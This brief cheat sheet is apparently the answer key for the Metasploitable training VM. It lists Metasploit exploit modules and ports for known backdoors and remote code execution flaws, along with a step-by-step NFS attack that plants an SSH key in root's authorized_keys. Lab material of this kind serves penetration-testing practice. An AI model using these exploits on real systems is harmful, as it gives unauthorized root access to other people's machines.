# Metasploitable-Answers
Exploits:

exploit/multi/samba/usermap_script <port:139>

exploit/unix/misc/distcc_exec <port:3632> + exploit/linux/local/udev_netlink (priviledge escalation cve2009-1185 -1 pid of udev pid)

exploit/multi/misc/java_rmi_server <port:1099>

exploit/unix/irc/unreal_ircd_3281_backdoor <port:6667>

exploit/unix/ftp/vsftpd_234_backdoor <port:21>

exploit/multi/http/php_cgi_arg_injection <port:80>

exploit/linux/misc/drb_remote_codeexec set URI druby://<host><port:8787>

NFS Misconfiguration <port:2049>:

rpcinfo -p <host> <this is port 111 rpcbind>

showmount -e <host> or -a

ssh-keygen

mkdir /tmp/test

mount -t nfs <host>:/ /tmp/test -o nolock

cat ~/.ssh/id_rsa.pub >> /tmp/test/root/.ssh/authorized_keys

umount /tmp/test/

ssh root@<host>

amap <ip> <port>
